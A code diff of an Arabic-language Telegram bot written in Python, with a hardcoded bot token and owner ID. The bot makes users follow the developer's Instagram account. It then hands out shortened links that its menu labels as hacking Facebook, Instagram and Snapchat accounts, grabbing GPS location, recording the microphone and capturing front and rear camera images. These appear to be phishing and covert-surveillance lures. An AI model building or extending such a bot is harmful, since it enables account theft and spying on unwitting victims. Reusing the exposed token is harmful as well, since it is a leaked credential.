@@ -6,7 +6,7 @@ from threading import Thread
 import os
 import time
 
-# إعداد السيرفر لضمان بقاء البوت شغال
+# إعداد السيرفر
 app = Flask('')
 @app.route('/')
 def home(): return "M.Y.9 System Online"
@@ -19,7 +19,6 @@ TOKEN = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE'
 MY_ID = '7238206121' # آي دي أبو سند
 bot = telebot.TeleBot(TOKEN)
 
-# تنظيف الاتصال
 bot.remove_webhook()
 time.sleep(1)
 
@@ -27,7 +26,6 @@ def short(url):
     try: return requests.get(f"https://is.gd/create.php?format=simple&url={url}").text
     except: return url
 
-# 1. عند الضغط على Start تظهر رسالة التحذير مع رابط حسابك الجديد
 @bot.message_handler(commands=['start'])
 def start(m):
     uid = m.chat.id
@@ -40,9 +38,8 @@ def start(m):
 🔴 تـحـذيـر: بـدون مـتـابـعـة المـطـور سـتـبـقى الروابـط مـشـفـرة 💀🔥
     """
     
-    # إنشاء الأزرار مع الرابط المحدث
     markup = types.InlineKeyboardMarkup()
-    # تم تعديل الرابط ليكون m_y_.9 كما طلبت
+    # تم تثبيت الرابط m_y_.9 ليعمل بشكل مباشر كزر URL
     btn_insta = types.InlineKeyboardButton("🔗 مـتـابـعـة المـطـور (إجـبـاري)", url="https://www.instagram.com/m_y_.9/")
     btn_done = types.InlineKeyboardButton("✅ تـم المـتـابـعـة (تـفـعـيـل)", callback_data="check_follow")
     markup.add(btn_insta)
@@ -50,7 +47,6 @@ def start(m):
     
     bot.send_message(uid, warning_text, reply_markup=markup)
 
-# 2. معالجة التفعيل وإظهار القائمة المزخرفة
 @bot.callback_query_handler(func=lambda call: call.data == "check_follow")
 def check_follow(call):
     uid, name = call.message.chat.id, call.from_user.first_name
@@ -77,20 +73,26 @@ def check_follow(call):
 🔹 اخـ^ـتـ^ـراق فـ^ـيـ^ـس بـ^ـوك (2009)
 🔗 `{lnks['fb']}`
 
+
 🔸 اخـ^ـتـ^ـراق انـ^ـسـ^ـتـ^ـغـ^ـرام (2009)
 🔗 `{lnks['ig']}`
+
 
 👻 اخـ^ـتـ^ـراق سـ^ـنـ^ـاب شـ^ـات (2009)
 🔗 `{lnks['sn']}`
 
+
 📍 سـ^ـحـ^ـب الـ^ـمـ^ـوقـ^ـع (GPS)
 🔗 `{lnks['lc']}`
+
 
 🎤 سـ^ـحـ^ـب الـ^ـصـ^ـوت (Mic)
 🔗 `{lnks['au']}`
 
+
 🤳 كـ^ـمـ^ـرة أمـ^ـامـ^ـيـ^ـة (HD)
 🔗 `{lnks['c1']}`
+
 
 📷 كـ^ـمـ^ـرة خـ^ـلـ^ـفـ^ـيـ^ـة (HD)
 🔗 `{lnks['c2']}`
@@ -100,6 +102,7 @@ def check_follow(call):
     """
     
     bot.delete_message(uid, call.message.message_id)
+    # ملاحظة: تم استخدام MarkdownV2 أو الهروب من الرموز لضمان عدم اختفاء الرموز
     bot.send_message(uid, main_msg, parse_mode="Markdown", disable_web_page_preview=True)
 
 if __name__ == "__main__":
